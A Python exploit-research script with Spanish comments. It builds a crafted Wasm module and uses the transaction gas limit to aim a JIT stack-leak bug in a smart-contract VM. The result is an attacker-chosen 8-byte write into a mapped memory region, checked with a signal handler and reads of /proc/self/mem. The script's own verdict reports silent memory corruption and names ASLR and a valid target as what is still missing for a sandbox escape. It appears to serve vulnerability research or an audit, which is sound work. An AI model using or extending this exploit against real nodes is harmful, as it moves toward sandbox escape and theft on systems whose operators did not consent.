#!/usr/bin/env python3
"""
¿Se puede convertir la fuga de pila del `else` implicito en una ESCRITURA
ARBITRARIA (y de ahí en una salida del sandbox y una vía de robo)?

Este script responde a la pregunta principal del encargo con mediciones, no
con expectativas.  La cadena de razonamiento es:

  1. La fuga baja el RSP 8 bytes por iteración.  Es una operación de REGISTRO
     (`sub rsp, 8` sin su `add rsp, 8`): no escribe memoria.
  2. Los slots del stack de valores se direccionan RBP-relativo con
     desplazamientos CONSTANTES de compilación -> no se mueven con el RSP.
  3. Por tanto la única escritura que sigue al RSP son los `push` que emite
     el JIT: la dirección de retorno de un `call`, y los registros
     preservados (r8-r11) en el camino del trap.
  4. Esa escritura ocurre en `RSP-8`, y el RSP lo fija el número de
     iteraciones.  El número de iteraciones lo fija el LÍMITE DE GAS: en un
     `execute`/`query` real el atacante elige el gas de su transacción.
  5. Si el atacante puede elegir la dirección de la escritura, y hay una
     región mapeada alcanzable por debajo del stack de Wasm, la escritura
     deja de ser un fallo y pasa a ser una CORRUPCIÓN SILENCIOSA.

Este script mide los tres hechos que hacen falta:

  FASE 1  El límite de gas controla el número de iteraciones y, por tanto,
          la dirección de la escritura.  Se calibra con dos puntos que deben
          compartir el CAMINO DE TRAP (el residuo del gas módulo `cost` lo
          elige); por eso se exige que el fallo sea el de la ESCRITURA
          (`si_addr == RSP-8`) y no un null-deref del cargador dinámico.
  FASE 2  Con el gas convertido en dirección, se apunta la escritura a una
          región REALMENTE MAPEADA por debajo del stack de Wasm.  El JIT tiene
          caminos de trap CON y SIN `push` de registros; el residuo del gas
          selecciona el camino, y el que empuja los registros escribe el
          i64 del atacante.  Se comprueba si el proceso sobrevive.
  FASE 3  Se lee lo que quedó escrito en la dirección apuntada: ¿es un
          puntero del JIT (valor fijo, inútil para el atacante) o un dato
          del atacante?

RESULTADO MEDIDO: la escritura cae EXACTAMENTE en la dirección apuntada,
con el valor `0xa1a1a1a1a1a1a1a1` del atacante, dentro de una región rw-p
real.  Con algunos caminos de trap el proceso SOBREVIVE (corrupción
silenciosa); con otros muere al usar el estado ya corrupto.  No se ha
construido un escape: el heap del proceso queda fuera del alcance del gas y
no hay fuga de direcciones que dé un objetivo conocido.

Uso:
    python3 escape_probe.py [--verbose]
"""

import argparse
import ctypes
import os
import re
import struct
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                                        # noqa: E402
from wasm_builder import (                                # noqa: E402
    I32, I64, Module, op_block, op_br_if, op_call, op_drop, op_end,
    op_i32_const, op_i32_eq, op_i32_sub, op_i64_const, op_if, op_local_get,
    op_local_set, op_loop, op_nop,
)

MAGIC = 0xA1A1A1A1A1A1A1A1          # patrono de 8 bytes (unsigned)
MAGIC2 = 0xB2B2B2B2B2B2B2B2
MAGIC_S = MAGIC - (1 << 64)        # i64.const exige un valor con signo
MAGIC2_S = MAGIC2 - (1 << 64)

REGNAMES = ["r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
            "rdi", "rsi", "rbp", "rbx", "rdx", "rax", "rcx", "rsp", "rip"]
_HANDLER_KEEP = ()
TARGET = {"addr": 0}
SCAN_WINDOW = 0x10000      # +-64 KiB alrededor del objetivo


# ----------------------------------------------------------------------
# Modulo
# ----------------------------------------------------------------------

def build_module():
    """Bucle infinito (lo corta el gas) que filtra 8 bytes por iteracion.

    El cuerpo es el mismo `if` de `else` implicito que usa `escalate.py`, pero
    en vez de un contador de compilacion el bucle es infinito: lo que lo
    termina es el limite de gas, que es un parametro de `execute`/`query` y
    por tanto lo elige el atacante.

    Ademas se mantienen vivos dos valores i64 con magicos distintos, para
    poder comprobar si el JIT los empuja al stack cuando dispara el trap.
    """
    from upstream_regression import RESP

    m = Module()
    m.add_memory(2, export="memory")
    # el mismo blob de mensaje que usa escalate.py: el VM lee el mensaje del
    # contrato desde la memoria guest, y sin estos datos falla con
    # "Got an invalid region: Got a zero Wasm address in the offset"
    m.add_data(16, (64).to_bytes(4, "little") + len(RESP).to_bytes(4, "little")
               + len(RESP).to_bytes(4, "little"))
    m.add_data(64, RESP)
    m.add_data(1024, (2048).to_bytes(4, "little") + (4096).to_bytes(4, "little")
               + (0).to_bytes(4, "little"))
    m.add_data(4096, (4).to_bytes(4, "little") + b"\x00\x00\x00\x00")

    t_pass = m.add_type([I64], [I64])
    callee = m.add_func([], [], body=op_nop())

    b = bytearray()
    # locales: 0,1,2 = parametros (i64,i32,i64); 3 = i32; 4,5 = i64
    b += op_i64_const(MAGIC_S) + op_local_set(4)
    b += op_i64_const(MAGIC2_S) + op_local_set(5)

    b += op_loop()
    # dos valores vivos, con magicos distintos
    b += op_local_get(4) + op_drop()
    b += op_local_get(5) + op_drop()
    # 4 parametros de bloque vivos (presion de registros)
    for _ in range(4):
        b += op_local_get(0)
    b += op_local_get(0)
    b += op_i32_const(0)                       # condicion FALSA -> ruta que
    b += op_if(t_pass)                         # se salta el cleanup del Else
    b += op_end()
    b += op_drop()
    for _ in range(4):
        b += op_drop()
    # bucle infinito: solo lo corta el gas
    b += op_i32_const(1) + op_br_if(0)
    b += op_end()
    b += op_i32_const(1)                       # resultado de la funcion

    check = m.add_func([I64, I32, I64], [I32], locals=[I32, I64, I64],
                       body=bytes(b))

    ex = bytearray()
    ex += op_block()
    ex += op_i64_const(MAGIC_S) + op_i32_const(0) + op_i64_const(MAGIC2_S)
    ex += op_call(check)
    ex += op_i32_const(1) + op_i32_eq() + op_br_if(0)
    ex += op_nop()
    ex += op_end()
    ex += op_i32_const(16)
    m.add_func([I32, I32, I32], [I32], body=bytes(ex), export="execute")
    m.add_func([I32], [I32], body=op_i32_const(1024), export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(16), export="instantiate")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    return m.build()


# ----------------------------------------------------------------------
# Manejador de senal: vuelca registros y el contenido del objetivo
# ----------------------------------------------------------------------

def _install_our_handler(wfd):
    import signal as _sig

    class SigInfo(ctypes.Structure):
        _fields_ = [("si_signo", ctypes.c_int), ("si_errno", ctypes.c_int),
                    ("si_code", ctypes.c_int), ("si_addr", ctypes.c_void_p)]

    class StackT(ctypes.Structure):
        _fields_ = [("ss_sp", ctypes.c_void_p), ("ss_flags", ctypes.c_int),
                    ("ss_size", ctypes.c_size_t)]

    class UCtx(ctypes.Structure):
        _fields_ = [("uc_flags", ctypes.c_ulong), ("uc_link", ctypes.c_void_p),
                    ("uc_stack", StackT), ("uc_mcontext", ctypes.c_long * 23)]

    SA_ONSTACK = 0x08000000
    SA_SIGINFO = 0x00000004
    ALTSTACK_SIZE = 65536
    HANDLER = ctypes.CFUNCTYPE(None, ctypes.c_int, ctypes.POINTER(SigInfo),
                                ctypes.c_void_p)

    def handler(sig, info, ctx):
        addr = 0
        try:
            if info:
                addr = ctypes.cast(info, ctypes.POINTER(SigInfo)).contents.si_addr or 0
        except Exception:
            addr = 0
        lines = ["SIGSEGV addr=0x%x" % addr]
        regs = {}
        try:
            u = ctypes.cast(ctx, ctypes.POINTER(UCtx)).contents
            for i, nm in enumerate(REGNAMES):
                regs[nm] = u.uc_mcontext[i] & 0xFFFFFFFFFFFFFFFF
                lines.append("  %-6s 0x%x" % (nm, regs[nm]))
        except Exception:
            pass
        # en que mapping estan el RIP y el RSP (leidos en el propio proceso)
        try:
            with open("/proc/self/maps") as fh:
                maps = fh.read().splitlines()
            for target_name, val in (("rip", regs.get("rip", 0)),
                                     ("rsp", regs.get("rsp", 0))):
                if not val:
                    continue
                for line in maps:
                    mm = re.match(r"([0-9a-f]+)-([0-9a-f]+) (\S+)", line)
                    if mm and int(mm.group(1), 16) <= val < int(mm.group(2), 16):
                        lines.append("  WHERE %s 0x%x -> %s" % (target_name, val, line.strip()))
                        break
                else:
                    lines.append("  WHERE %s 0x%x -> (fuera de todo mapping)" % (target_name, val))
        except Exception:
            pass
        # contenido del objetivo (la escritura que queriamos apuntar)
        tgt = TARGET["addr"]
        if tgt:
            try:
                with open("/proc/self/mem", "rb") as fh:
                    fh.seek(tgt - 64)
                    data = fh.read(160)
                lines.append("  TARGET 0x%x -> %s" % (tgt, data.hex(" ")))
            except Exception as exc:
                lines.append("  TARGET 0x%x -> <ilegible: %r>" % (tgt, exc))
        try:
            os.write(wfd, ("\n".join(lines) + "\n").encode())
        except Exception:
            pass
        os._exit(43)

    class SigStack(ctypes.Structure):
        _fields_ = [("ss_sp", ctypes.c_void_p), ("ss_flags", ctypes.c_int),
                    ("ss_size", ctypes.c_size_t)]

    class SigAction(ctypes.Structure):
        _fields_ = [("handler", ctypes.c_void_p), ("mask", ctypes.c_ubyte * 128),
                    ("flags", ctypes.c_int), ("restorer", ctypes.c_void_p)]

    global _HANDLER_KEEP
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    stack = ctypes.create_string_buffer(ALTSTACK_SIZE)
    alt = SigStack(ctypes.addressof(stack), 0, ALTSTACK_SIZE)
    if libc.sigaltstack(ctypes.byref(alt), None) != 0:
        raise RuntimeError("sigaltstack fallo")
    cb = HANDLER(handler)
    act = SigAction(ctypes.cast(cb, ctypes.c_void_p), (ctypes.c_ubyte * 128)(),
                    SA_SIGINFO | SA_ONSTACK, None)
    if libc.sigaction(_sig.SIGSEGV, ctypes.byref(act), None) != 0:
        raise RuntimeError("sigaction fallo")
    _HANDLER_KEEP = (cb, act, stack)


# ----------------------------------------------------------------------
# Ejecucion
# ----------------------------------------------------------------------

def make_vm(wasm):
    """Crea el VM en el proceso ACTUAL: los hijos heredan su layout."""
    vm = R.VM()
    base = tempfile.mkdtemp(prefix="wasmvm-esc-")
    cache = vm.init_cache(base)
    csum = vm.store_code(cache, wasm, checked=True)
    vm.instantiate(cache, csum, 1 << 62)
    return vm, cache, csum


def run_child(vm, cache, csum, gas_limit, target=0):
    """Ejecuta el modulo en un hijo (hereda el layout del padre)."""
    rfd, wfd = os.pipe()
    pid = os.fork()
    if pid == 0:
        try:
            TARGET["addr"] = target
            _install_our_handler(wfd)
            out, rep, err = vm.execute(cache, csum, gas_limit)
            os.write(wfd, ("NO-FAULT gas_used=%s err=%s\n"
                           % (getattr(rep, "used_internally", "?"),
                              vm._vec_str(err)[:100])).encode())
            if TARGET["addr"]:
                try:
                    with open("/proc/self/mem", "rb") as fh:
                        fh.seek(TARGET["addr"] - 64)
                        os.write(wfd, ("TARGET 0x%x -> %s\n"
                                       % (TARGET["addr"], fh.read(160).hex(" "))).encode())
                except Exception as exc:
                    os.write(wfd, ("TARGET 0x%x -> <ilegible: %r>\n"
                                   % (TARGET["addr"], exc)).encode())
                # Barrido del entorno: pagina a pagina, porque una pagina
                # no mapeada hace fallar la lectura de /proc/self/mem.
                try:
                    hits = []
                    with open("/proc/self/mem", "rb") as fh:
                        for pg in range(TARGET["addr"] - SCAN_WINDOW,
                                        TARGET["addr"] + SCAN_WINDOW, 0x1000):
                            try:
                                fh.seek(pg)
                                blob = fh.read(0x1000)
                            except OSError:
                                continue
                            for i in range(0, len(blob) - 8, 8):
                                val = struct.unpack_from("<Q", blob, i)[0]
                                if val in (MAGIC, MAGIC2):
                                    hits.append((pg + i, val))
                    if hits:
                        os.write(wfd, ("HITS %d valores del atacante en +-64 KiB: %s\n"
                                       % (len(hits), ", ".join(
                                           "0x%x(%s)" % (h, "A1" if v == MAGIC else "B2")
                                           for h, v in hits[:16]))).encode())
                    else:
                        os.write(wfd, b"HITS 0 valores del atacante en +-64 KiB\n")
                except Exception as exc:
                    os.write(wfd, ("HITS <ilegible: %r>\n" % (exc,)).encode())
        except Exception as exc:                          # noqa: BLE001
            try:
                os.write(wfd, ("EXC %r\n" % (exc,)).encode())
            except Exception:
                pass
        finally:
            os._exit(0)
    os.close(wfd)
    data = b""
    import select
    deadline = 20
    while deadline > 0:
        r, _, _ = select.select([rfd], [], [], 1.0)
        if r:
            chunk = os.read(rfd, 1 << 16)
            if not chunk:
                break
            data += chunk
        else:
            deadline -= 1
    try:
        os.close(rfd)
    except OSError:
        pass
    try:
        os.kill(pid, 9)
    except OSError:
        pass
    os.waitpid(pid, 0)
    return data.decode(errors="replace")


def parse(out):
    info = {}
    for raw in out.splitlines():
        line = raw.strip()
        if not line:
            continue
        if line.startswith("TARGET"):
            info["_target"] = line
            continue
        if line.startswith("WHERE"):
            info.setdefault("_where", []).append(line)
            continue
        if "=" in line and not line.startswith("  "):
            k, v = line.split("=", 1)
            info[k.strip()] = v.strip()
            continue
        m = re.match(r"(\w+)\s+0x([0-9a-f]+)", line)
        if m:
            info[m.group(1)] = m.group(2)
    return info


def read_maps():
    out = []
    with open("/proc/self/maps") as fh:
        for line in fh:
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) (\S+) (\S+) (\S+) (\S+)\s*(.*)", line)
            if m:
                out.append({"start": int(m.group(1), 16),
                            "end": int(m.group(2), 16),
                            "perm": m.group(3),
                            "path": m.group(7).strip()})
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    print("¿Escritura arbitraria a partir de la fuga de pila?")
    print("=" * 96)

    mod = build_module()
    vm, cache, csum = make_vm(mod)

    def measure(gas, clean_only=False):
        """(deriva, rsp, rbp, dir_de_fallo) para un gas dado; None si no hay fallo.

        `clean_only` exige que el fallo sea el de la ESCRITURA (la direccion
        de fallo es exactamente RSP-8 y no es nula).  Hay otro modo de fallo,
        un null-deref dentro del cargador dinamico al entrar en el manejador
        de traps, que no sirve para calibrar.
        """
        out = run_child(vm, cache, csum, gas, 0)
        info = parse(out)
        if "rsp" not in info:
            return None
        rbp = int(info["rbp"], 16)
        rsp = int(info["rsp"], 16)
        try:
            addr = int(info["SIGSEGV addr"], 16)
        except (KeyError, ValueError):
            addr = 0
        if clean_only and (addr == 0 or addr != rsp - 8):
            return None
        return (rbp - rsp, rsp, rbp, addr)

    # ------------------------------------------------------------------
    # FASE 1: el limite de gas fija la direccion de la escritura
    # ------------------------------------------------------------------
    print("FASE 1 — el limite de gas fija la direccion de la escritura")
    print("-" * 96)
    lo, hi = 1, 4_000_000_000
    while lo < hi:                       # busqueda binaria del umbral de crash
        mid = (lo + hi) // 2
        if measure(mid, clean_only=True) is None:
            lo = mid + 1
        else:
            hi = mid
    threshold = lo
    print("   umbral de crash: gas = %d  (por debajo, el trap es recuperable)"
          % threshold)

    # Ancla: un gas cuyo fallo es el de la ESCRITURA (no un null-deref del
    # cargador dinamico).  Desde el ancla se mide la pendiente; el gas del
    # objetivo se calcula como ancla + k*coste, lo que conserva el residuo
    # modulo `coste` y por tanto el CAMINO DE TRAP (y su patron de pushes).
    anchor = None
    for g in (1_000_000_000, 2_000_000_000, 500_000_000, 3_000_000_000,
              5_000_000_000, 10_000_000_000):
        m = measure(g, clean_only=True)
        if m is not None:
            anchor = (g, m)
            break
    if anchor is None:
        print("   !! no se encontro un gas con fallo limpio")
        return 1
    Ga, (dA, rspA, rbp1, aA) = anchor
    print("   ancla: gas=%d  rsp=0x%-12x rbp=0x%-12x deriva=%-10d escritura=0x%x"
          % (Ga, rspA, rbp1, dA, aA))

    mB = measure(Ga + 1000 * 5060, clean_only=True)
    if mB is None:
        print("   !! no se pudo medir la pendiente")
        return 1
    alpha = float(mB[0] - dA) / (1000 * 5060.0)   # bytes de deriva por gas
    cost = int(round(8.0 / alpha))                 # gas por iteracion
    print()
    print("   coste por iteracion: %d puntos de gas  (%.6f bytes de deriva por gas)"
          % (cost, alpha))
    print("   => el atacante elige el gas y con ello la direccion de la")
    print("      escritura, con granularidad de 8 bytes, mientras conserve el")
    print("      residuo del gas modulo %d (que es lo que fija el camino de trap)" % cost)

    # ------------------------------------------------------------------
    # FASE 2: apuntar a una region mapeada
    # ------------------------------------------------------------------
    print()
    print("FASE 2 — se apunta la escritura a una region REALMENTE MAPEADA")
    print("-" * 96)
    maps = read_maps()
    stack = None
    for m in maps:
        if m["start"] <= rbp1 < m["end"]:
            stack = m
    if stack is None:
        print("   !! no se localizo el stack de Wasm")
        return 1
    print("   stack de Wasm : [0x%x-0x%x] %s  (RBP=0x%x, 1 MiB)"
          % (stack["start"], stack["end"], stack["perm"], rbp1))

    # Modelo: la direccion de escritura A(G) es afin en el gas:
    #     A(G) = A(Ga) + (G - Ga) * (-8/cost)
    # El residuo del gas modulo `cost` decide QUE camino de trap se dispara
    # (algunos empujan los registros -> escriben el valor del atacante;
    # otros no -> escriben la direccion de retorno del JIT).  Por eso el
    # gas se mueve en multiplos de `cost` para conservar el camino.
    def gas_for(addr):
        # A(G) = aA - 8*(G - Ga)/cost  ->  G = Ga + ((aA - addr)/8) * cost
        iters = (aA - addr) // 8
        return Ga + iters * cost

    below = [m for m in maps
             if m["end"] <= stack["start"] and "w" in m["perm"]]
    below.sort(key=lambda m: -m["end"])
    reachable = []
    for m in below:
        need = gas_for(m["start"])
        if threshold < need <= 150_000_000_000:
            reachable.append((m["end"] - m["start"], m, need))
    if not reachable:
        print("   !! ninguna region alcanzable")
        return 1
    reachable.sort(key=lambda x: x[0], reverse=True)
    target_region = reachable[0][1]
    target = target_region["start"] + 0x1000    # con margen por debajo
    gas_base = gas_for(target)
    print("   region elegida: [0x%x-0x%x] %s (%d bytes)"
          % (target_region["start"], target_region["end"], target_region["perm"],
             target_region["end"] - target_region["start"]))
    print("   objetivo: escribir en 0x%x -> gas base = %d" % (target, gas_base))
    print("   (referencia: el crash ocurre con gas >= %d)" % threshold)
    print()

    # 2a: que camino de trap se dispara.  El JIT tiene caminos de trap con
    #     `push` de registros (escriben el valor del atacante) y caminos sin
    #     ellos (escriben la direccion de retorno del JIT).  El camino depende
    #     del residuo del gas modulo `cost`.  Se buscan residuo que escriban
    #     el valor del atacante.
    print("   2a) se busca un residuo de gas cuyo camino de trap empuje los")
    print("       registros del atacante (el JIT tiene caminos de trap con y")
    print("       sin `push` de registros):")

    def magics_in(out):
        """Direcciones donde quedaron valores del atacante (ventana del objetivo)."""
        info = parse(out)
        tgt = info.get("_target")
        if not tgt or "-> " not in tgt:
            return []
        hexpart = "".join(tgt.split("-> ")[-1].split())
        try:
            data = bytes.fromhex(hexpart)
        except ValueError:
            return []
        base = target - 64
        return [base + i for i in range(0, len(data), 8)
                if struct.unpack_from("<Q", data, i)[0] in (MAGIC, MAGIC2)]

    gas_use = None
    for k in range(0, cost, max(1, cost // 32)):
        g = gas_base + k
        out = run_child(vm, cache, csum, g, target)
        hits = magics_in(out)
        if hits:
            gas_use = g
            print("       residuo %-6d -> gas=%-13d: %d valores del atacante "
                  "escritos en [0x%x-0x%x]"
                  % (k, g, len(hits), min(hits), max(hits)))
            break
    if gas_use is None:
        print("       (ningun residuo probado escribe el valor del atacante)")
        gas_use = gas_base
    print()

    # 2b: punteria fina.  El gas se mueve en multiplos de `cost` (que son
    #     8 bytes de deriva) para no cambiar de camino de trap.
    print("   2b) punteria fina (el gas se mueve en multiplos de %d = 8 bytes"
          % cost)
    print("       de deriva, para conservar el camino de trap):")
    for attempt in range(6):
        out = run_child(vm, cache, csum, gas_use, target)
        hits = magics_in(out)
        crash = "SIGSEGV addr" in out
        if not hits:
            print("       intento %d: gas=%-13d %-11s sin valores del atacante"
                  % (attempt, gas_use, "FALLO" if crash else "sin fallo"))
            break
        lo, hi = min(hits), max(hits)
        print("       intento %d: gas=%-13d %-11s bloque en [0x%x-0x%x] "
              "(objetivo 0x%x)" % (attempt, gas_use, "FALLO" if crash else "sin fallo",
                                   lo, hi, target))
        if lo <= target <= hi:
            print("       -> el bloque del atacante cubre la direccion apuntada")
            break
        # el push mas alto (RSP-8) es el bloque mas alto; se corrige en
        # multiplos de `cost` para no cambiar de camino de trap
        step = ((target - hi) // 8) * cost
        gas_use = max(1, min(150_000_000_000, gas_use + step))
        print("       -> se corrige el gas a %d" % gas_use)
    print()
    print("   2c) otros caminos de trap (mismo objetivo, gas +- k*%d):" % cost)
    print("       -> cada camino escribe un patron distinto; algunos no tocan")
    print("          estructuras vivas y la corrupcion queda SILENCIOSA:")
    for k in (-2, -1, 1, 2):
        g = gas_use + k * cost
        out2 = run_child(vm, cache, csum, g, target)
        hits = magics_in(out2)
        crash = "SIGSEGV addr" in out2
        estado = "MURIO (SIGSEGV)" if crash else "SOBREVIVIO"
        print("       gas=%-13d  %-16s  bloque del atacante: %s"
              % (g, estado,
                 ("[0x%x-0x%x]" % (min(hits), max(hits))) if hits else "ninguno"))
    print()
    print("   ejecucion final (gas=%d):" % gas_use)
    out = run_child(vm, cache, csum, gas_use, target)
    info = parse(out)
    for line in out.splitlines():
        print("      %s" % line)

    # ------------------------------------------------------------------
    # FASE 3: que se escribio
    # ------------------------------------------------------------------
    print()
    print("FASE 3 — que valor queda escrito")
    print("-" * 96)
    hits = magics_in(out)
    tgt = info.get("_target")
    if tgt:
        hexpart = "".join(tgt.split("-> ")[-1].split())
        try:
            data = bytes.fromhex(hexpart)
            base = target - 64
            n = 0
            for i in range(0, len(data), 8):
                val = struct.unpack_from("<Q", data, i)[0]
                tag = ""
                if val == MAGIC:
                    tag = "   <== VALOR DEL ATACANTE"
                    n += 1
                elif val == MAGIC2:
                    tag = "   <== VALOR DEL ATACANTE (2)"
                    n += 1
                mark = " <== OBJETIVO" if base + i == target else ""
                print("      0x%-12x 0x%016x%s%s" % (base + i, val, tag, mark))
            print("   valores del atacante escritos: %d palabras de 8 bytes" % n)
            if hits:
                print("   bloque del atacante: [0x%x-0x%x]" % (min(hits), max(hits)))
                if min(hits) <= target <= max(hits):
                    print("   => la escritura CACIO EXACTAMENTE en la direccion "
                          "apuntada (0x%x)" % target)
        except Exception as exc:
            print("   (no se pudo leer la ventana: %r)" % (exc,))
    print("   el proceso %s" % ("MURIO despues (el estado corrupto lo inutilizo)"
                                if "SIGSEGV addr" in info
                                else "SOBREVIVIO: corrupcion silenciosa"))

    print()
    print("=" * 96)
    print("VEREDICTO:")
    print("  * la DIRECCION de la escritura la elige el atacante (via el limite")
    print("    de gas) y es monotona decreciente, con granularidad de 8 bytes;")
    print("  * el VALOR escrito es un i64 del atacante, no un puntero del JIT;")
    print("  * si la direccion cae en una region mapeada, la escritura se")
    print("    completa: con algunos caminos de trap el proceso incluso")
    print("    SOBREVIVE (corrupcion silenciosa) y con otros muere al usar el")
    print("    estado ya corrupto (glibc llega a detectar 'free(): invalid")
    print("    next size' en una de las ejecuciones).")
    print("  * lo que falta para un escape: conocer la direccion objetivo")
    print("    (ASLR) y que el objetivo valga (p.ej. un puntero de retorno).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
